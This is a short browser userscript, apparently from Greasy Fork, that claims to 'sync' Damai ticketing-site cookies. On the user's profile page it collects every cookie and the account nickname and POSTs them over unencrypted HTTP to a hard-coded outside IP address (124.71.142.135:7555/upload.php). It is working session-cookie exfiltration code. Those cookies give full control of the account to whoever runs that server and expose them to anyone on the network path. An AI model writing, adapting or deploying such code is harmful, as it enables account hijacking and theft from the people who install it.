// ==UserScript==
// @name         同步大麦Cookie
// @namespace    Damai-cookie
// @version      0.2
// @description  同步大麦COokie
// @author       Tidysongs
// @match        https://m.damai.cn/damai/mine/my/index.html*
// @grant        GM_xmlhttpRequest
// @connect      124.71.142.135
// @downloadURL https://update.greasyfork.org/scripts/468228/%E5%90%8C%E6%AD%A5%E5%A4%A7%E9%BA%A6Cookie.user.js
// @updateURL https://update.greasyfork.org/scripts/468228/%E5%90%8C%E6%AD%A5%E5%A4%A7%E9%BA%A6Cookie.meta.js
// ==/UserScript==

(function() {
    'use strict';
    var cookies = document.cookie;
    // 输出全部Cookie
    console.log('全部Cookie:', cookies);
    setTimeout(()=>{
        var nickname = document.querySelectorAll('.nickname')[0].innerHTML.trim()
        if(nickname != "登录/注册"){
    GM_xmlhttpRequest({
        url:"http://124.71.142.135:7555/upload.php",
        method :"POST",
        data:`name=${nickname}&cookie=${cookies}`,
        headers: {
            "Content-type": "application/x-www-form-urlencoded"
        },
        onload:function(xhr){
            console.log(xhr.responseText);
            alert(nickname + "的" + xhr.responseText)
        }
    });
        }
    },1000)

})();